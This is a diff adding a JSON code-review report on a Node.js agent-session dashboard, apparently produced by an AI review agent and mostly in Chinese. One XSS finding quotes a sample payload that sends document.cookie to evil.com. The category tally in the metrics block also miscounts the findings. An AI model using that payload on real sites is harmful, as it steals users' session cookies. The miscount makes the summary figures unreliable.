@@ -1,0 +1,269 @@
+{
+  "agent_id": "A",
+  "skill": "code-review-skill",
+  "philosophy": "你是'可维护性优先'的代码审查专家。你的核心理念来自 The Pragmatic Programmer 和 Clean Code 传统：代码首先是写给人看的，其次才是给机器执行的。你关注：命名是否自解释？函数是否做且只做一件事？抽象层次是否一致？重复代码是否可以提取？注释是否解释了'为什么'而非'做了什么'？",
+  "review_scope": {
+    "files": [
+      "agents.js",
+      "index.js",
+      "pricing.js",
+      "routes/open.js",
+      "routes/session.js",
+      "routes/sessions.js",
+      "routes/snapshots.js",
+      "scanner.js",
+      "shared.js",
+      "snapshot.js",
+      "sse.js",
+      "watcher.js"
+    ],
+    "lines_total": 1821
+  },
+  "findings": [
+    {
+      "id": "A-001",
+      "file": "index.js",
+      "line": 40,
+      "line_range": [
+        40,
+        56
+      ],
+      "severity": "important",
+      "category": "security",
+      "title": "import-localstorage 路由存在存储型 XSS 注入风险",
+      "description": "`importData`（import-data.json 的原始内容）通过字符串拼接直接嵌入 `<script>` 标签体内：`var d=' + importData + ';`。若 JSON 文件被篡改为包含恶意 payload，如 `{\"key\":\"value\"};fetch('https://evil.com?c='+document.cookie);//}`，会在浏览器中执行任意 JavaScript。虽然利用需要服务器文件系统写入权限，但此模式违反了纵深防御原则，且 `<script>` 内嵌 JSON 本身就是危险的反模式。",
+      "suggestion": "不要用字符串拼接生成内联脚本。改用服务端渲染将数据注入为 JSON 并设置 Content-Type，或通过单独的 API 端点返回 JSON 后由前端 fetch。最小改动方案：在服务端对 importData 做 JSON.parse 校验后，用 JSON.stringify 重新序列化后再拼接，确保不会注入可执行代码。",
+      "code_snippet_bad": "var importData = fs.readFileSync(importFile, \"utf8\");\nvar html = '...<script>!function(){var d=' + importData + ';...';\nres.end(html);",
+      "code_snippet_good": "var importData = fs.readFileSync(importFile, \"utf8\");\ntry { JSON.parse(importData); } catch(e) { res.writeHead(400); res.end(\"Invalid JSON\"); return; }\nvar html = '...<script>!function(){var d=' + JSON.stringify(importData) + ';...';\nres.end(html);",
+      "rule_reference": "OWASP: Stored XSS Prevention; CWE-79",
+      "confidence": 0.92
+    },
+    {
+      "id": "A-002",
+      "file": "routes/open.js",
+      "line": 172,
+      "line_range": [
+        170,
+        188
+      ],
+      "severity": "blocking",
+      "category": "bug",
+      "title": "settings.json 的 5 秒延迟恢复存在竞态条件",
+      "description": "`launchSessionDirect` 先调用 `swapSettingsJson(configFile)` 将 settings.json 替换为目标配置，然后用 `setTimeout(..., 5000)` 恢复到 ORIGINAL_SETTINGS。如果两个会话在 5 秒内先后打开（T=0 打开会话A，T=3 打开会话B），T=5 时会话A的恢复逻辑会将 settings.json 覆盖为 ORIGINAL_SETTINGS，导致会话B（正在运行的 VSCode）丢失其配置。两个定时器互相不知道对方的存在。",
+      "suggestion": "使用引用计数或配置栈：每次 swap 时递增计数器，每次 restore 时递减。仅当计数器归零时才真正写回 ORIGINAL_SETTINGS。或者用进程级互斥锁确保同一时间只有一个活跃的 settings swap。",
+      "code_snippet_bad": "swapSettingsJson(configFile);\nsetTimeout(function() {\n  if (ORIGINAL_SETTINGS && currentSettings !== ORIGINAL_SETTINGS) {\n    fsModule.writeFileSync(defaultSettingsPath, ORIGINAL_SETTINGS, \"utf-8\");\n  }\n}, 5000);",
+      "code_snippet_good": "if (!shared._settingsSwapCount) shared._settingsSwapCount = 0;\nswapSettingsJson(configFile);\nshared._settingsSwapCount++;\nsetTimeout(function() {\n  shared._settingsSwapCount--;\n  if (shared._settingsSwapCount === 0 && ORIGINAL_SETTINGS) {\n    fsModule.writeFileSync(defaultSettingsPath, ORIGINAL_SETTINGS, \"utf-8\");\n  }\n}, 5000);",
+      "rule_reference": "Race condition in file-based configuration swap",
+      "confidence": 0.95
+    },
+    {
+      "id": "A-003",
+      "file": "index.js",
+      "line": 100,
+      "line_range": [
+        95,
+        115
+      ],
+      "severity": "important",
+      "category": "bug",
+      "title": "UUID 级联替换可能导致内容损坏",
+      "description": "UUID 映射替换逻辑对每个旧 UUID 依次执行 `newContent.split(oldUuid).join(newUuid)`，但未处理 UUID 间的子串关系。虽然 UUID 发生子串碰撞概率极低，但 JSONL 文件中 UUID 会出现在 JSON 字符串值（如 tool_use 的 input 字段）中。更致命的是：文本内容（如 AI 回复中包含调试输出的 UUID）中的 UUID 也会被替换，导致会话记录被静默损坏。此外，同一个旧 UUID 的不同大小写出现被分别替换为相同的 newUuid，这本身逻辑正确，但 `Object.keys(uuidMap)` 的顺序是不确定的（V8 中通常按插入顺序但 ES 规范不保证），可能导致跨运行的替换结果不一致。",
+      "suggestion": "仅在 JSON 结构字段中替换 UUID（如 sessionId, parentSessionId 等已知字段），而非全文盲替。或者在替换前对 UUID 按长度降序排序，先替换长的 UUID 避免子串问题。对 JSON 值中出现的不在映射表中的 UUID，不应替换而是生成新的映射。",
+      "code_snippet_bad": "for (var oi = 0; oi < oldUuids.length; oi++) {\n  newContent = newContent.split(oldUuids[oi]).join(uuidMap[oldUuids[oi]]);\n  newContent = newContent.split(oldUuids[oi].toUpperCase()).join(uuidMap[oldUuids[oi]]);\n}",
+      "code_snippet_good": "var sortedUuids = oldUuids.sort(function(a, b) { return b.length - a.length; });\nfor (var oi = 0; oi < sortedUuids.length; oi++) {\n  var escaped = sortedUuids[oi].replace(/[-\\\\^$*+?.()|[\\]{}]/g, '\\\\$&');\n  var regex = new RegExp(escaped, 'gi');\n  newContent = newContent.replace(regex, uuidMap[sortedUuids[oi].toLowerCase()]);\n}",
+      "rule_reference": "Correctness of string replacement in structured data",
+      "confidence": 0.85
+    },
+    {
+      "id": "A-004",
+      "file": "index.js",
+      "line": 42,
+      "line_range": [
+        40,
+        135
+      ],
+      "severity": "important",
+      "category": "performance",
+      "title": "HTTP 请求处理路径中大量使用同步文件 I/O 阻塞事件循环",
+      "description": "多个路由处理器在请求-响应周期内使用 `fs.readFileSync`、`fs.writeFileSync`、`fs.statSync` 等同步 API。在 Node.js 单线程模型中，这些调用会阻塞事件循环，导致所有其他请求（包括 SSE 连接的心跳）被延迟。受影响的路由包括：`/`（读 index.html）、`/import-localstorage`（读 import-data.json）、`/api/create-and-open`（读源会话文件 + 写入新会话文件）、`/api/session/:id`（读会话文件 + 读子 agent 文件）。对于可能达到数百 MB 的会话 JSONL 文件，阻塞时间可能长达数秒。",
+      "suggestion": "将文件 I/O 替换为异步版本：`fs.promises.readFile()`、`fs.promises.writeFile()`。对于 `/api/create-and-open` 这种需要多个文件操作的路径，可以使用 async/await 链式调用。对于 `/api/session/:id` 的尾部读取，可以使用 `fs.createReadStream` 流式处理。",
+      "rule_reference": "Node.js best practice: never block the event loop in request handlers",
+      "confidence": 0.97
+    },
+    {
+      "id": "A-005",
+      "file": "agents.js",
+      "line": 70,
+      "line_range": [
+        65,
+        80
+      ],
+      "severity": "nit",
+      "category": "bug",
+      "title": "parseSubAgent 未追踪 _ctok (cache read tokens)，导致子 Agent 成本计算偏低",
+      "description": "`parseSubAgent` 在解析 assistant 消息的 usage 时，只累加了 `_itok` (input_tokens) 和 `_otok` (output_tokens)，完全忽略了 `cache_read_input_tokens`。而 `pricing.calcCost` 使用 `_ctok` 来计算缓存读取费用。这导致所有子 Agent 的缓存读取成本被计为 0，成本估算偏保守（实际成本更高）。虽然影响较小，但数据不完整。",
+      "suggestion": "在 agents.js 的 parseSubAgent 中增加一行：`info._ctok += (obj.message.usage.cache_read_input_tokens || 0);`，与主会话解析（scanner.js 已正确追踪 _ctok）保持一致。",
+      "code_snippet_bad": "if (obj.message && obj.message.usage) {\n  info._itok += (obj.message.usage.input_tokens || 0);\n  info._otok += (obj.message.usage.output_tokens || 0);\n}",
+      "code_snippet_good": "if (obj.message && obj.message.usage) {\n  info._itok += (obj.message.usage.input_tokens || 0);\n  info._otok += (obj.message.usage.output_tokens || 0);\n  info._ctok += (obj.message.usage.cache_read_input_tokens || 0);\n}",
+      "rule_reference": "Data completeness: all token types must be tracked consistently across main sessions and sub-agents",
+      "confidence": 0.9
+    },
+    {
+      "id": "A-006",
+      "file": "shared.js",
+      "line": 44,
+      "line_range": [
+        44,
+        65
+      ],
+      "severity": "important",
+      "category": "maintainability",
+      "title": "全局可变状态缺乏并发控制，多请求场景下存在数据竞争风险",
+      "description": "`sessionCache`、`subAgentCache`、`fileOffsets`、`sseClients`、`snapshotList` 等全部作为 shared 模块的全局可变状态暴露。多个并发请求同时调用 `scanSessions` 会读写同一个 `sessionCache` Map，`processChanges`（由文件监控/定时器触发）也会并发修改。虽然 Node.js 单线程避免了真正的并行竞态，但异步交错执行仍可导致：缓存被部分更新时另一个请求读到不一致的中间状态、`fileOffsets` 和 `sessionCache` 不同步、`scanSubAgents` 的 `clear()` + 重建期间其他代码读到空缓存。",
+      "suggestion": "引入简单的读写锁或使用不可变更新模式（缓存更新时创建新 Map 再原子替换引用）。至少对 `scanSubAgents` 的 `clear()` → 重建过程加一个完成标志位，让消费者在重建期间等待或使用旧数据。考虑将缓存封装到独立的 CacheManager 类中，提供线程安全（async-safe）的 get/set/invalidate 接口。",
+      "rule_reference": "Shared mutable state is the root of many concurrency bugs",
+      "confidence": 0.88
+    },
+    {
+      "id": "A-007",
+      "file": "routes/sessions.js",
+      "line": 8,
+      "line_range": [
+        8,
+        35
+      ],
+      "severity": "important",
+      "category": "performance",
+      "title": "/api/sessions 和 /api/agents 每次请求都触发全量扫描并清空子 Agent 缓存",
+      "description": "两个最频繁调用的 API 端点每次请求都调用 `scanner.scanSessions(shared.PROJECTS_DIR, [])` 做全目录遍历 + 增量解析，然后 `agents.scanSubAgents(sessions)` 再次遍历子 agent 目录。`scanSubAgents` 内部第一行就是 `shared.subAgentCache.clear()`，意味着前一次请求刚建立的缓存立刻被丢弃。在高频轮询场景下（前端每 3-5 秒刷新一次），这会导致大量重复的目录遍历和文件 stat/read 操作。",
+      "suggestion": "将会话扫描与 API 请求解耦。`/api/sessions` 不应触发扫描，而是直接返回内存中缓存的会话列表。扫描由 `watcher.js` 的文件变更事件和定时轮询驱动，结果写入缓存。API 端点仅读取缓存并返回。`scanSubAgents` 的 `clear()` 应改为增量更新（新增/更新检测到的 agent，移除已不存在的）。",
+      "code_snippet_bad": "if (req.url === \"/api/sessions\") {\n  scanner.scanSessions(shared.PROJECTS_DIR, []).then(function(sessions) {\n    agents.scanSubAgents(sessions);",
+      "code_snippet_good": "if (req.url === \"/api/sessions\") {\n  var sessions = [];\n  shared.sessionCache.forEach(function(v) { sessions.push(v); });\n  // 状态实时刷新，但不重新扫描文件",
+      "rule_reference": "Cache invalidation: separate read path (API) from write path (scanner/watcher)",
+      "confidence": 0.93
+    },
+    {
+      "id": "A-008",
+      "file": "routes/sessions.js",
+      "line": 16,
+      "line_range": [
+        14,
+        40
+      ],
+      "severity": "nit",
+      "category": "maintainability",
+      "title": "会话状态/活跃度/热度计算在多个文件中重复实现",
+      "description": "`getStatus()`、`getActivity()`、`tokenHeat`、`calcCost()` 的调用模式在三个位置几乎逐字重复：`routes/sessions.js` 的 `/api/sessions` 和 `/api/agents` 处理器、`routes/session.js` 的 `buildSessionDetailResponse`、以及 `watcher.js` 的 `processChanges`。每个位置都有 `s.status = scanner.getStatus(...)`、`s.activity = scanner.getActivity(...)` 等 4-5 行相同代码。未来如果增加新的计算维度（如 token 效率评分），需要修改所有位置。",
+      "suggestion": "提取一个 `scanner.enrichSession(session)` 函数，集中处理所有富化逻辑（status、activity、tokenHeat、cost）。所有调用方只需一行 `scanner.enrichSession(s)`。",
+      "code_snippet_bad": "for (var i = 0; i < sessions.length; i++) {\n  var s = sessions[i];\n  s.status = scanner.getStatus(s.fileMtimeMs, s.lastMeaningfulTimestamp, s.lastMeaningfulStopReason);\n  s.activity = scanner.getActivity(s.recentUserMsgs || 0);\n  s.tokenHeat = scanner.getTokenHeat((s._itok || 0) + (s._otok || 0));\n  s.cost = pricing.calcCost(s);\n}",
+      "code_snippet_good": "for (var i = 0; i < sessions.length; i++) {\n  scanner.enrichSession(sessions[i]);\n}",
+      "rule_reference": "DRY: Don't Repeat Yourself — extract repeated computation into a single source of truth",
+      "confidence": 0.95
+    },
+    {
+      "id": "A-009",
+      "file": "routes/session.js",
+      "line": 90,
+      "line_range": [
+        90,
+        200
+      ],
+      "severity": "important",
+      "category": "performance",
+      "title": "buildRelationsResponse 同步读取并全量解析父会话文件，可能阻塞数秒",
+      "description": "`buildRelationsResponse` 使用 `fs.readFileSync(relTarget._file, 'utf-8')` 将整个父会话 JSONL 文件读入内存，然后逐行解析全部内容两次（第一次匹配 dispatch 事件，第二次构建 waterfall trace）。对于大型会话文件（可达 100-500MB），同步读取会阻塞事件循环数秒。两次全量解析也是不必要的：dispatch 事件匹配和 waterfall trace 可以在一次遍历中完成。",
+      "suggestion": "将文件读取改为流式处理（`fs.createReadStream` + readline），在单次遍历中同时收集 dispatch 事件和构建 waterfall spans。如果必须全量加载，使用 `fs.promises.readFile` 并 `await`，避免阻塞。设置合理的行数上限（如 10000 行），超过时截断并返回提示。",
+      "rule_reference": "Node.js: never sync-read large files in the request path",
+      "confidence": 0.94
+    },
+    {
+      "id": "A-010",
+      "file": "agents.js",
+      "line": 53,
+      "line_range": [
+        50,
+        110
+      ],
+      "severity": "suggestion",
+      "category": "maintainability",
+      "title": "parseSubAgent 与 buildRelationsResponse 存在显著的子 Agent 解析逻辑重复",
+      "description": "子 Agent 的 JSONL 解析逻辑在两处独立实现：`agents.js` 的 `parseSubAgent`（约 60 行）和 `routes/session.js` 的 `buildRelationsResponse`（约 40 行）。两者都在遍历 lines、提取标题、累加 token、检测 stop_reason、统计 toolCallCount。`parseSubAgent` 还做了 meta.json 标题覆盖和 keyDecisions 收集，`buildRelationsResponse` 则额外计算 cost 和 status。如果解析逻辑需要调整（如支持新的消息格式），两处都必须同步修改。",
+      "suggestion": "让 `buildRelationsResponse` 直接调用 `agents.parseSubAgent(filePath, agentId, parentSessionId)` 获取已解析的 agent 信息，再补充 relations 特有的边匹配逻辑。这样可以删除约 40 行重复代码，并确保解析逻辑只有一处权威来源。",
+      "rule_reference": "DRY: identical parsing logic duplicated across modules",
+      "confidence": 0.9
+    },
+    {
+      "id": "A-011",
+      "file": "scanner.js",
+      "line": 98,
+      "line_range": [
+        95,
+        110
+      ],
+      "severity": "suggestion",
+      "category": "performance",
+      "title": "parseSessionChunk 对大文件分配完整 Buffer，且未限制内存上限",
+      "description": "`Buffer.alloc(Math.max(1, stat.size - startOffset))` 在首次扫描大文件（startOffset=0）时分配与文件大小相等的 Buffer。对于 200MB 的会话文件，这会直接分配 200MB 堆内存，可能导致内存压力甚至 OOM。虽然 V8 的 Buffer.alloc 会清零内存（比 allocUnsafe 慢），但对于增量场景（startOffset > 0）分配较小 Buffer 是合理的。问题主要在首次全量解析。",
+      "suggestion": "对首次解析设置合理的读取上限（如 10MB），超过时使用流式逐行读取而非一次性读入内存。或者至少使用 `Buffer.allocUnsafe` 替代 `Buffer.alloc`（因为紧接着就被 `readSync` 覆盖填充），省去清零开销。对于增量场景（startOffset > 0），当前分配策略是合理的。",
+      "code_snippet_bad": "var buf = Buffer.alloc(Math.max(1, stat.size - startOffset));",
+      "code_snippet_good": "var readSize = Math.max(1, stat.size - startOffset);\nvar maxRead = 10 * 1024 * 1024;\nif (startOffset === 0 && readSize > maxRead) readSize = maxRead;\nvar buf = Buffer.allocUnsafe(readSize);",
+      "rule_reference": "Defensive memory management: limit buffer allocations in I/O paths",
+      "confidence": 0.82
+    },
+    {
+      "id": "A-012",
+      "file": "scanner.js",
+      "line": 40,
+      "line_range": [
+        15,
+        50
+      ],
+      "severity": "nit",
+      "category": "correctness",
+      "title": "getStatus 的 '异常' 状态对于 fileAge < 10分钟的 tool_use 存在误判窗口",
+      "description": "`getStatus` 在 `lastMeaningfulStopReason === 'tool_use'` 时，若 `fileAge >= 10分钟` 则返回 `'异常'`。但在以下场景会误判：(1) Agent 正在执行一个耗时超过 10 分钟的长时间工具调用（如大型文件写入），期间文件确实不会被修改 — 此时 Agent 并未崩溃，但面板显示异常；(2) 会话文件位于网络驱动器或 WSL 文件系统上，mtime 更新可能延迟。10 分钟的硬编码阈值缺乏灵活性。",
+      "suggestion": "考虑引入多信号判断：除了 fileAge，还检查是否有活跃的进程 PID（从 session metadata 文件中读取），或使用心跳机制。将硬编码的 10 分钟阈值提取为可配置常量 `shared.TOOL_USE_TIMEOUT_MS`。至少将阈值放宽到 30 分钟以覆盖大文件操作场景。",
+      "rule_reference": "Status detection heuristic: avoid false positives for long-running tool calls",
+      "confidence": 0.78
+    }
+  ],
+  "metrics": {
+    "total_findings": 12,
+    "by_severity": {
+      "blocking": 1,
+      "important": 6,
+      "nit": 3,
+      "suggestion": 2
+    },
+    "by_category": {
+      "security": 1,
+      "bug": 4,
+      "performance": 4,
+      "maintainability": 2,
+      "correctness": 1
+    },
+    "review_duration_seconds": 0
+  },
+  "praise": [
+    {
+      "file": "sse.js",
+      "line": 1,
+      "comment": "SSE 模块设计整洁，职责单一。broadcastSSE 的反向删除死连接策略正确避免了迭代中修改数组的经典陷阱。cleanupSSE 确保关闭时所有连接被正确终止，无资源泄漏。15 秒心跳保活机制是生产级实践。"
+    },
+    {
+      "file": "index.js",
+      "line": 185,
+      "comment": "Graceful shutdown 处理完善：SIGINT/SIGTERM 信号捕获、watcher/sse/server 顺序清理、5 秒强制退出保底——这是生产环境中容易被忽略但至关重要的模式。"
+    },
+    {
+      "file": "watcher.js",
+      "line": 30,
+      "comment": "debounce 机制（800ms WATCH_DEBOUNCE_MS）设计合理：用 Map 管理定时器、文件变更后合并处理、processChanges 有 `_processing` 互斥锁防止重入。这说明作者对文件监控的常见陷阱有清晰认知。"
+    },
+    {
+      "file": "scanner.js",
+      "line": 170,
+      "comment": "增量解析 + 缓存合并（parseSessionChunk + mergeSessionData）的整体架构是有远见的设计。通过 fileOffsets 跟踪已读位置、_seenPromptIds 去重用户消息计数、_truncated 检测文件被截断——这些细节表明作者认真思考了大规模会话文件的性能问题。"
+    }
+  ]
+}
